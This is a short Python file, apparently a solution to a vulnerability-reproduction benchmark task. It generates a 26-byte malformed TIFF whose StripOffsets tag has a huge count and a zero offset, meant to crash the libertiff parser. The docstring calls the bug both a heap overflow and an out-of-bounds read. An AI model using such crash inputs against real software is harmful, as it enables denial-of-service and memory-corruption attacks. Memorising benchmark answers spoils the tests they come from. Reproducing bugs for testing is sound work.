import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in third_party/libertiff.

        The vulnerability is a heap buffer overflow caused by processing a TIFF
        Image File Directory (IFD) entry with an invalid "offline" data offset.
        An offline tag is one where the data is too large to fit in the 4-byte
        value/offset field and is stored elsewhere, pointed to by the offset.

        This PoC constructs a minimal TIFF file with a single malicious tag:
        1.  The tag's data size (`count` * `sizeof(type)`) is made larger than 4
            bytes, forcing it to be an "offline" tag.
        2.  The `offset` field for this offline tag is set to 0.

        When the library attempts to read the tag's data from the invalid
        offset 0, it leads to an out-of-bounds read from the beginning of the
        file, causing a crash.
        """
        # TIFF Header (8 bytes):
        # - 'II' for little-endian byte order.
        # - 0x002a (42) for the TIFF version.
        # - 0x00000008 for the offset to the first (and only) IFD.
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD (Image File Directory) section:
        # Number of entries (2 bytes): We need only one malicious entry.
        num_entries = b'\x01\x00'

        # Malicious Tag Entry (12 bytes):
        # We use a tag like StripOffsets which is expected to be an array of offsets.
        # - Tag ID: 273 (StripOffsets)
        # - Data Type: 4 (LONG, 4 bytes per value)
        # - Count: A large value (0xFFFFFFFF) to ensure the data is "offline"
        #          (total size > 4 bytes) and to cause a large memory operation.
        # - Offset: 0, the invalid value that triggers the vulnerability.
        tag_id = 273
        data_type = 4
        count = 0xFFFFFFFF
        offset = 0
        malicious_tag = struct.pack('<HHII', tag_id, data_type, count, offset)

        # Offset to the next IFD (4 bytes):
        # 0 indicates the end of the IFD chain.
        next_ifd_offset = b'\x00\x00\x00\x00'

        # Assemble the final PoC.
        # Total length: 8 (header) + 2 (num_entries) + 12 (tag) + 4 (next_ifd) = 26 bytes.
        poc = header + num_entries + malicious_tag + next_ifd_offset
        
        return poc